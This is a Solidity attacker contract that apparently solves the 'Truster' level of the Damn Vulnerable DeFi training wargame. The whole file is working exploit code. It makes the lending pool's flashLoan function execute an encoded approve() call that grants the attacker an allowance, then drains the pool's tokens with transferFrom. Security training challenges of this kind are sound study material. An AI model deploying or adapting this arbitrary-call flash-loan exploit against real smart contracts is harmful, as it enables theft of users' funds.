pragma solidity ^0.6.0;

import "./TrusterLenderPool.sol";

contract AttackerContract{
	uint256 public totalTokens = 1000000 ether;
	address public attackerAddress;
	// DamnValuableToken public dvTokenContract;
	address public dvTokenContract;
	TrusterLenderPool public poolContract;

	constructor(address _poolAddress,address _tokenAddress) public{
		attackerAddress = msg.sender;
		poolContract = TrusterLenderPool(_poolAddress);
		dvTokenContract = _tokenAddress;
	}

	
	function setUpAttack() public{
		bytes memory approvePayload = abi.encodeWithSignature("approve(address,uint256)",address(this),totalTokens);
		bytes memory flashLoanPayload = abi.encodeWithSignature(
			"flashLoan(uint256,address,address,bytes)",
			0,attackerAddress,dvTokenContract,approvePayload);
		(bool success, ) = address(poolContract).call(flashLoanPayload);
		require (success,"Set Up Failed");
	}	

	function executeAttack() public{
		bytes memory transferPayload = abi.encodeWithSignature("transferFrom(address,address,uint256)",address(poolContract),attackerAddress,totalTokens);
		(bool success, ) = dvTokenContract.call(transferPayload);
		require (success,"Attackss Failed");	
	}
	
}